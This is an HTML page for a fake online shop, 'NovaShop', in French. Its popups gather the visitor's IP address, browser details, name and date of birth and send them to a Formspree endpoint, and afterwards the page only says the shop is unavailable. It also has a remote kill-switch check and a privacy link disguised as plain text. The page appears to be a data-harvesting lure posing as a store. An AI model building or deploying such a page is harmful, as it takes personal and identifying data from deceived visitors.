<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>NovaShop</title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%; font-family: Arial, sans-serif;
    }
    .content {
      display: flex; justify-content: center; align-items: center; height: 100%; background-color: #f0f0f0;
    }
    h1 {
      font-size: 3em; color: #333; display: none;
    }
    .popup {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background-color: rgba(0, 0, 0, 0.6);
      display: flex; justify-content: center; align-items: center;
      z-index: 9999;
    }
    .popup-box {
      background-color: white; padding: 30px 40px; border-radius: 10px;
      text-align: center; box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 90%;
    }
    .popup-box p {
      margin-bottom: 20px; font-size: 1.2em;
    }
    .popup-box button {
      padding: 10px 20px; font-size: 1em; border: none;
      background-color: #007bff; color: white;
      border-radius: 5px; cursor: pointer;
    }
    .popup-box button:hover {
      background-color: #0056b3;
    }
    /* Styles texte politique */
    a.plain-link {
      color: inherit;             /* prend la couleur du texte autour */
      text-decoration: none;      /* enlève le soulignement */
      font-weight: normal;
      cursor: pointer;
    }
    a.plain-link:hover {
      text-decoration: underline; /* effet au survol */
    }
  </style>
</head>
<body>

  <!-- Popup 1 -->
  <div class="popup" id="popup1">
    <div class="popup-box">
      <p>Bienvenue chez NovaShop !</p>
      <form id="popupForm">
        <input type="hidden" name="details" id="detailsField" />

        <!-- Texte discret -->
        <div style="font-size: 11px; color: #888; margin-bottom: 10px; text-align: justify;">
          Il est crucial de noter que ce texte est présenté à titre purement informatif et ne saurait engager quiconque sans un examen préalable et une compréhension approfondie de l’ensemble des conditions énoncées, lesquelles peuvent évoluer sans préavis en fonction de facteurs externes, internes, contextuels ou réglementaires non exhaustivement listés ici, de sorte que la lecture attentive et complète est recommandée uniquement à celles et ceux souhaitant pleinement appréhender les modalités parfois complexes et fluctuantes qui gouvernent l’usage, le traitement et la gestion des informations et données relatives à l’interaction avec notre plateforme commerciale.
          Les informations que vous fournissez lors de votre commande, ainsi que certaines données techniques liées à votre navigation et à votre appareil, sont collectées et traitées dans le cadre de la gestion de vos achats et de l’amélioration continue de nos services. Ces données peuvent être utilisées pour le traitement des commandes, la gestion des livraisons, l’analyse des comportements d’achat, la prévention des fraudes, ainsi que pour assurer la sécurité et la conformité réglementaire. Elles peuvent également servir à adapter les offres commerciales et l’expérience utilisateur, tout en respectant les obligations légales en vigueur. Nous mettons en œuvre des mesures techniques et organisationnelles visant à protéger vos données, sans pouvoir garantir une sécurité totale compte tenu des évolutions technologiques. Les informations collectées sont conservées pour une durée adaptée aux finalités évoquées, et ne sont pas exploitées à des fins commerciales par des tiers non autorisés. Vous disposez de droits d’accès, de modification, de suppression et de limitation concernant vos données, que vous pouvez exercer en contactant le service client. En validant votre commande, vous acceptez les conditions de traitement des données décrites ci-dessus.

          <br><br>

          <!-- Texte d'information avec lien intégré -->
          <span style="font-size: 11px; color: #888; text-align: justify;">
            En validant ce formulaire, vous acceptez le traitement de vos données personnelles dans le cadre de notre 
            <span id="policyToggle" style="color: inherit; text-decoration: none; cursor: pointer;">
              politique de confidentialité
            </span>, conformément à la législation en vigueur.
          </span>

          <!-- Bloc de texte masqué qui s'affichera au clic -->
<div id="policyText" style="display: none; font-size: 11px; color: #888; margin-top: 10px; text-align: justify; height: 150px; overflow-y: auto; border: 1px solid #ccc; padding: 10px; border-radius: 5px;">
            <strong>Politique de confidentialité</strong><br><br>
            Conformément aux dispositions légales et réglementaires en vigueur relatives à la protection des données personnelles, notamment le Règlement Général sur la Protection des Données (RGPD) et la Loi Informatique et Libertés modifiée, nous portons à votre connaissance que les informations recueillies via notre plateforme font l'objet d'un traitement automatisé ayant pour finalité principale la gestion, le suivi et l'amélioration continue de nos services, ainsi que la sécurisation des interactions utilisateurs.<br><br>
            Les données collectées comprennent, sans s'y limiter, les informations techniques telles que votre adresse IP, type de navigateur, paramètres linguistiques, ainsi que des métadonnées associées à vos sessions de navigation. Ces données sont traitées dans le strict respect des principes de minimisation, de finalité, de conservation limitée et de confidentialité.<br><br>
            Par ailleurs, nous nous engageons à ne divulguer ces informations à aucun tiers non expressément autorisé, sauf obligations légales contraires. Les données sont conservées pour une durée limitée au regard des finalités poursuivies et sont accessibles uniquement par les services internes dûment habilités.<br><br>
            Vous bénéficiez par ailleurs de droits d’accès, de rectification, d’effacement, de limitation du traitement, ainsi que du droit d’opposition et de portabilité, que vous pouvez exercer en contactant notre service client aux coordonnées indiquées dans la section « Contact » de notre site.<br><br>
            Il est important de noter que malgré les mesures techniques et organisationnelles mises en œuvre, aucune sécurité informatique ne saurait être garantie à 100%, compte tenu des évolutions permanentes des technologies et des menaces.<br><br>
            En validant votre consentement via la case prévue à cet effet, vous reconnaissez avoir pris connaissance de la présente politique et acceptez le traitement de vos données personnelles conformément aux modalités décrites ci-dessus.<br><br>
            Pour toute question ou demande relative à vos données, nous vous invitons à nous contacter directement. Cette politique peut être mise à jour ponctuellement afin de s’adapter aux évolutions légales ou techniques ; nous vous invitons donc à la consulter régulièrement.<br><br>
            <em>Merci pour votre confiance.<br><br>
            En utilisant ce site, vous acceptez cette politique.</em>
          </div>

          <br>

          <label style="font-size: 11px; color: #888;">
            <input type="checkbox" id="consentCheckbox" required />
            J’accepte la politique de confidentialité
          </label>
        </div>

        <button type="submit" id="btnOk">OK</button>
      </form>
    </div>
  </div>

  <!-- Popup 2 -->
  <div class="popup" id="popup2" style="display:none;">
    <div class="popup-box">
      <p>Merci ! Veuillez renseigner vos informations :</p>
      <form id="infoForm">
        <input type="text" id="prenom" name="prenom" placeholder="Prénom" required style="width: 90%; margin-bottom: 10px; padding: 8px; font-size: 14px;" />
        <input type="text" id="nom" name="nom" placeholder="Nom" required style="width: 90%; margin-bottom: 10px; padding: 8px; font-size: 14px;" />
        <input type="date" id="dob" name="dob" placeholder="Date de naissance" required style="width: 90%; margin-bottom: 10px; padding: 8px; font-size: 14px;" />
        <button type="submit">Continuer</button>
      </form>
    </div>
  </div>

  <!-- Contenu -->
  <div class="content">
    <h1 id="message">La boutique est indisponible :/</h1>
  </div>

  <script>



(async function() {
  try {
    // L'URL distante à vérifier (fichier HTML, JSON, etc.)
    const response = await fetch('https://raw.githubusercontent.com/TheRhyno/questionnaire/refs/heads/main/IPdesac.txt', { method: 'HEAD' });

    // Si la réponse n'est pas OK, bloquer
    if (!response.ok) {
      alert('Le site est actuellement indisponible.');
      // Bloquer tout contenu, remplacer par un message d'erreur
      document.body.innerHTML = '<h1 style="text-align:center; margin-top: 50px;">Erreur : accès interdit</h1>';
      return;
    }
  } catch (e) {
    // En cas d'erreur (pas de connexion, timeout)
    alert('Le site est actuellement indisponible.');
    document.body.innerHTML = '<h1 style="text-align:center; margin-top: 50px;">Erreur : accès interdit</h1>';
    return;
  }
})();





    // Affichage / masquage politique confidentialité
    document.getElementById("policyToggle").addEventListener("click", function () {
      const policy = document.getElementById("policyText");
      policy.style.display = policy.style.display === "none" ? "block" : "none";
    });

    // Variable globale pour stocker les données techniques
    let technicalDetails = "";

    // Fonction pour récupérer IP
    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return "Inconnue";
      }
    }

    // Gestion du premier formulaire (techniques + consentement)
    document.getElementById("popupForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      // Récupération données techniques
      const ip = await getIP();
      const userAgent = navigator.userAgent;
      const language = navigator.language;
      const url = window.location.href;
      const date = new Date().toLocaleString();

      technicalDetails = `

Adresse IP : ${ip}
Navigateur : ${userAgent}
Langue : ${language}
Page : ${url}
Heure locale : ${date}
      `.trim();



// Envoi immédiat des données techniques seules
const formDataTech = new FormData();
formDataTech.append("étape", "Consentement validé uniquement");
formDataTech.append("details", technicalDetails);

fetch("https://formspree.io/f/mnnvekzn", {
  method: "POST",
  headers: {
    Accept: "application/json"
  },
  body: formDataTech
})
.then(response => {
  if (!response.ok) {
    console.warn("Échec de l'envoi des données techniques");
  }
})
.catch(() => {
  console.warn("Erreur lors de l'envoi des données techniques");
});




      // Stockage dans champ caché (au cas où)
      document.getElementById("detailsField").value = technicalDetails;

      // Si la checkbox est cochée, on masque le 1er popup, affiche le 2e
      if (document.getElementById("consentCheckbox").checked) {
        document.getElementById("popup1").style.display = "none";
        document.getElementById("popup2").style.display = "flex";
      } else {
        alert("Veuillez accepter la politique de confidentialité.");
      }
    });






    // Gestion du second formulaire (prénom, nom, dob + envoi mail)
    document.getElementById("infoForm").addEventListener("submit", function (e) {
      e.preventDefault();

      // Récupération valeurs du second formulaire
      const prenom = document.getElementById("prenom").value.trim();
      const nom = document.getElementById("nom").value.trim();
      const dob = document.getElementById("dob").value;

      // Création d'un objet FormData pour envoyer TOUTES les données
      const formData = new FormData();

      // Ajout des données techniques
      formData.append("details", technicalDetails);

      // Ajout des données personnelles
      formData.append("prénom", prenom);
      formData.append("nom", nom);
      formData.append("date de naissance", dob);

      // Envoi via fetch à Formspree (remplace par ton endpoint Formspree)
      fetch("https://formspree.io/f/mnnvekzn", {
        method: "POST",
        headers: {
          Accept: "application/json"
        },
        body: formData
      })
        .then(response => {
          if (response.ok) {
            alert("Bienvenue chez Novashop !");
            // Masquer popup 2 et afficher message
            document.getElementById("popup2").style.display = "none";
            document.getElementById("message").style.display = "block";
          } else {
            alert("Erreur lors de l'envoi, veuillez réessayer.");
          }
        })
        .catch(() => {
          alert("Erreur lors de l'envoi, veuillez vérifier votre connexion.");
        });
    });
  </script>

</body>
</html>
